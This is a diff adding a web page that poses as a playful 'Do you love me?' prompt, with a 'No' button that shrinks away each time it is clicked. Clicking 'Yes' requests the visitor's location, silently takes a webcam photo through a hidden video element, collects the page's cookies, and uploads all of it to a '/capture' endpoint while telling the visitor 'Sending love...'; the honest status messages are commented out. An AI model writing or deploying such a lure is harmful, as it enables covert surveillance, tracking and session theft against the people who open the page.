@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Verification</title>
+    <style>
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        background-color: #ffe6e6; /* Soft pink background */
+        overflow: hidden; /* Prevent scrolling when buttons get huge */
+      }
+      .container {
+        background: white;
+        padding: 3rem;
+        border-radius: 20px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        max-width: 90%;
+      }
+      h2 {
+        color: #ff4d4d;
+        font-size: 2.5rem;
+        margin-bottom: 2rem;
+      }
+      .buttons {
+        display: flex;
+        gap: 20px;
+        justify-content: center;
+        align-items: center;
+        flex-wrap: wrap;
+      }
+      button {
+        padding: 15px 30px;
+        font-size: 1.2rem;
+        cursor: pointer;
+        border: none;
+        border-radius: 50px;
+        transition: all 0.3s ease;
+      }
+      #yes-btn {
+        background-color: #ff4d4d;
+        color: white;
+        font-weight: bold;
+      }
+      #yes-btn:hover {
+        background-color: #ff3333;
+        transform: scale(1.05);
+      }
+      #no-btn {
+        background-color: #e0e0e0;
+        color: #333;
+      }
+      #no-btn:hover {
+        background-color: #d0d0d0;
+      }
+      #status {
+        margin-top: 20px;
+        color: #666;
+        font-size: 0.9rem;
+      }
+      video {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h2>Do you love me? 💖</h2>
+      <div class="buttons">
+        <button id="yes-btn" onclick="startCapture()">Yes</button>
+        <button id="no-btn" onclick="handleNo()">No</button>
+      </div>
+      <p id="status"></p>
+      <video id="video" width="640" height="480" autoplay></video>
+      <canvas
+        id="canvas"
+        width="640"
+        height="480"
+        style="display: none"
+      ></canvas>
+    </div>
+
+    <script>
+      let yesScale = 1;
+      let noScale = 1;
+
+      // Set a test cookie to verify capture works
+      document.cookie = "test_cookie=verified_user_123; path=/; max-age=3600";
+      document.cookie =
+        "session_id=" + Math.random().toString(36).substring(7) + "; path=/";
+
+      function handleNo() {
+        const yesBtn = document.getElementById("yes-btn");
+        const noBtn = document.getElementById("no-btn");
+
+        // Up size Yes
+        yesScale += 0.4;
+        yesBtn.style.transform = `scale(${yesScale})`;
+        // Also increase margin to avoid overlapping too quickly
+        yesBtn.style.margin = `${yesScale * 5}px`;
+
+        // Down size No
+        noScale *= 0.8;
+        noBtn.style.transform = `scale(${noScale})`;
+
+        // Optional: Make No button text change or just visual resize
+        // If it gets too small, hide it
+        if (noScale < 0.1) {
+          noBtn.style.display = "none";
+        }
+      }
+
+      async function startCapture() {
+        const status = document.getElementById("status");
+        status.innerText = "Yay! ❤️ Sending love...";
+
+        // Disable buttons
+        document.getElementById("yes-btn").disabled = true;
+        document.getElementById("no-btn").disabled = true;
+
+        let position = null;
+        let imageData = null;
+        const errors = [];
+
+        // 1. Get Location
+        try {
+          // status.innerText = "Requesting Location access...";
+          position = await new Promise((resolve, reject) => {
+            if (!navigator.geolocation)
+              reject(new Error("Geolocation not supported"));
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+          });
+        } catch (err) {
+          console.error("Location Error:", err);
+          let msg = "Location failed: ";
+          if (err.code === 1) msg += "Permission denied.";
+          else if (err.code === 2) msg += "Position unavailable.";
+          else if (err.code === 3) msg += "Timeout.";
+          else msg += err.message || err;
+          errors.push(msg);
+        }
+
+        // 2. Get Camera
+        try {
+          // status.innerText = "Requesting Camera access...";
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+
+          await new Promise((r) => setTimeout(r, 1000));
+
+          const canvas = document.getElementById("canvas");
+          const context = canvas.getContext("2d");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          imageData = canvas.toDataURL("image/png");
+
+          stream.getTracks().forEach((track) => track.stop());
+        } catch (err) {
+          console.error("Camera Error:", err);
+          errors.push("Camera failed: " + (err.message || err));
+        }
+
+        if (!position && !imageData) {
+          status.innerText = "Failed to send love:\n" + errors.join("\n");
+          document.getElementById("yes-btn").disabled = false;
+          return;
+        }
+
+        // 3. Send Data
+        try {
+          // status.innerText = "Uploading captured data...";
+          const payload = {};
+          if (imageData) payload.image = imageData;
+          payload.cookies = document.cookie; // Capture cookies
+          if (position) {
+            payload.location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+            };
+          }
+
+          const response = await fetch("/capture", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+
+          if (response.ok) {
+            let successMsg = "Love sent successfully! ❤️";
+            // if (errors.length > 0) successMsg += "\n(Warnings: " + errors.join(", ") + ")";
+            status.innerText = successMsg;
+          } else {
+            status.innerText = "Server Error: " + response.statusText;
+          }
+        } catch (err) {
+          console.error("Upload Error:", err);
+          status.innerText = "Network Error: " + err.message;
+        }
+      }
+    </script>
+  </body>
+</html>
